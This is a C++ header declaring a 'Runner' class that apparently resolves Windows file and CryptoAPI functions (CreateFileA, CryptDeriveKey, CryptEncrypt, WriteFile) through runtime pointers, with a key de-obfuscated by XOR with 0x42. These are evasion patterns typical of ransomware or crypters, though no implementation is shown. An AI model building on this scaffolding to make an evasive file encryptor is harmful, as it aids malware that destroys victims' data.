#pragma once
#include <cstdint>
#include <vector>
#include <Windows.h>
#include <Wincrypt.h>
#include <iostream>

#include "utils.h"

class Key {
private:
	BYTE* Data;
	DWORD Size;
public:
	Key(BYTE* data, DWORD size) {
		Data = data;
		Size = size;

		for (int i = 0; i < Size; i++)
			Data[i] ^= 0x42;
	};

	BYTE* GetKey(void) { return Data; };
	DWORD GetKeySize(void) { return Size; };
};

class Runner
{
private:
	uint8_t* FileData;
	size_t FileSize;
	Key* key;
	
	uint64_t kernel32dll_ptr[3];
	uint64_t advapi32dll_ptr[7];


	HANDLE (*pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
	BOOL (*pCryptAcquireContextW)(HCRYPTPROV*,LPCWSTR,LPCWSTR,DWORD,DWORD);
	BOOL (*pCryptCreateHash)(HCRYPTPROV,ALG_ID,HCRYPTKEY,DWORD,HCRYPTHASH*);
	BOOL (*pCryptHashData)(HCRYPTHASH, CONST BYTE*,DWORD,DWORD);
	BOOL (*pCryptDeriveKey)(HCRYPTPROV,ALG_ID,HCRYPTHASH,DWORD,HCRYPTKEY*);
	BOOL (*pCryptEncrypt)(HCRYPTKEY,HCRYPTHASH,BOOL,DWORD,BYTE*,DWORD*,DWORD);
	BOOL (*pWriteFile)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
	BOOL(*pCloseHandle)(HANDLE);
	BOOL(*pCryptDestroyHash)(HCRYPTHASH);
	BOOL(*pCryptReleaseContext)(HCRYPTPROV, DWORD);

public:
	Runner();
	void convert_pointers(void);
};



